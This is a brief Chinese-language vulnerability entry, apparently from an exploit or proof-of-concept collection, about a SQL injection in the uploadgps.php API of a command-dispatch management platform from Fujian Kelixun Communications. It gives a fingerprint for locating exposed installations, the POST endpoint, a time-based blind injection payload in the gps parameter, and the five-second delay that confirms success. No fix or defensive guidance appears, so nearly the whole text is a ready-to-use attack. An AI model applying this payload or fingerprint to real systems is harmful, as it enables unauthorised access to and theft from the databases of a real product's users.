# 福建科立讯通信有限公司指挥调度管理平台uploadgps.php存在SQL注入漏洞

福建科立讯通信有限公司指挥调度管理平台 ｜ SQL注入 ｜ —
- **指纹**：`body="指挥调度管理平台"`
- **请求**：`POST /api/client/task/uploadgps.php HTTP/1.1`

**Payload**
```
uuid=&gps=1'+AND+(SELECT+7679+FROM+(SELECT(SLEEP(5)))ozYR)+AND+'fqDZ'='fqDZ&number=
```
- **响应特征**：200 响应时间>=5s